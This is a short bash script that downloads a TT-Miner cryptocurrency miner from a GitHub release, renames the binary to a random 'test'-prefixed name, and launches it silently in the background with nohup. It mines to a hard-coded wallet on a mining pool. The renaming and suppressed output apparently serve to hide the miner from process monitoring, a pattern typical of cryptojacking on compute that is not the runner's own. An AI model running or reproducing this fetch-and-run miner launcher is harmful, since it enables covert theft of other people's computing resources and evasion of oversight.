#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 3 | head -n 1)

wget -O dot https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta5/TT-Miner-2024.2.1B5.2.tar.gz

tar xvf dot

cd TT-Miner-2024.2.1B5.2

mv TT-Miner test$kolot

nohup ./test$kolot -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
